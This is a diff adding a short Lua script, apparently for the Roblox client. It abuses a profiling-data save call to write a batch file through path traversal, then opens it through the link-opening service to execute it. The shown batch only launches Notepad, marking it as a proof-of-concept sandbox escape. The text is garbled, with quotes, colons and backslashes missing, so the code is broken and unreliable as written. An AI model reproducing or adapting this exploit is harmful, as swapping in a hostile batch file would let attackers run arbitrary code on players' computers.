@@ -1,0 +1,10 @@
+
+local LinkingService = gameGetService(LinkingService)
+local ScriptContext = gameGetService(ScriptContext)
+
+local scriptContent = [[@ECHO off
+START %SystemRoot%system32notepad.exe
+]]
+
+local payload = ScriptContextSaveScriptProfilingData(scriptContent, ........test.bat)
+LinkingServiceOpenUrl(payload) 
